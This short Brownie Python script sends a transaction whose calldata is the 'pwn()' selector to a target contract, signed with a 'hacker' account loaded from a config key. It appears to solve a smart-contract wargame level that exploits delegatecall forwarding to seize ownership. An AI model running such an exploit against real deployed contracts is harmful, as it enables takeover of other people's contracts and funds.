from brownie import accounts, config, web3

def attack(target, hacker):
    hacker.transfer(to=target, data=web3.keccak(text='pwn()'))
    #print("Test "+ web3.keccak(text='pwn()').hex())

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    attack(target, hacker)

